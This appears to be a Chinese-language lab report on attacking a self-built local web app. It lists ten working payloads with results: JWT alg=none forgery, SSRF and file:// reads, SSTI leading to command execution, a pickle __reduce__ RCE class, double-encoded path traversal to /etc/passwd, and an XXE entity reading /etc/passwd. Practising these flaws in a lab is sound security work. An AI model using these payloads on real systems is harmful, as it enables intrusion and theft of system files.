# 进阶本地靶场：10/10 全破

- 目标：`http://127.0.0.1:8898`（自建，仅监听 loopback）
- 源码：`/tmp/pentest-lab2/lab2.py`
- 时间：2026-11-09 01:30 – 01:40

## 战果

| # | 类型 | 载荷 | 结果 |
|---|---|---|---|
| 1 | JWT alg=none | `{"alg":"none"}.{"role":"admin"}.` | ✅ admin=true |
| 2 | JWT 弱密钥爆破 | 字典命中 `lab-secret-do-not-use-in-prod` | ✅ 伪造 admin |
| 3 | SSRF 内网 | `url=http://127.0.0.1:8898/internal` | ✅ `INTERNAL_ONLY_FLAG{ssrf_reached_metadata}` |
| 4 | SSRF file:// | `url=file:///etc/hosts` | ✅ 读到内容 |
| 5 | SSTI 探针 | `{{7*7}}` → 49 | ✅ |
| 6 | SSTI 读环境 | `{{__import__("os").environ.get("HOME")}}` | ✅ `/Users/zhanchunfeng` |
| 7 | SSTI RCE | `{{__import__("subprocess").check_output(["id"]).decode()}}` | ✅ `uid=501` |
| 8 | Pickle RCE | `__reduce__` → `os.system` | ✅ 落地 `PWNED_BY_PICKLE` |
| 9 | 路径穿越 | `%252e%252e/%252e%252e/%252e%252e/etc/passwd` | ✅ 双编码绕过 |
| 10 | XXE | `<!ENTITY xx SYSTEM "file:///etc/passwd">` | ✅ 读到 root 行 |

## 关键技术点

### JWT alg=none
```json
header: {"alg":"none","typ":"JWT"}
payload: {"user":"attacker","role":"admin"}
signature: (空)
```

### Pickle RCE
```python
class Evil:
    def __reduce__(self):
        return (os.system, ("echo PWNED_BY_PICKLE > /tmp/pwned.txt",))
```

### 路径穿越双编码
```
%2e%2e  → 被第一次检查拦
%252e%252e → 第一次不解码，第二次解码成 ..
```

### XXE
```python
parser = etree.XMLParser(load_dtd=True, resolve_entities=True)
```

## 踩坑

1. **XXE 第一版无效**：用 `xml.parsers.expat` 只注册了 handler 不解析实体值。换 `lxml` + `resolve_entities=True` 才通。
2. **路径穿越层数**：`files/` 下需 3 层 `../` 才到 `/etc`，第一次只写了 2 层。
3. **SSRF 云元数据超时**：`169.254.169.254` 在本机无路由，属预期（非 bug）。

## 复现

```bash
cd /tmp/pentest-lab2 && python3 lab2.py   # 监听 127.0.0.1:8898
```

停止：`lsof -ti:8898 | xargs kill -9`
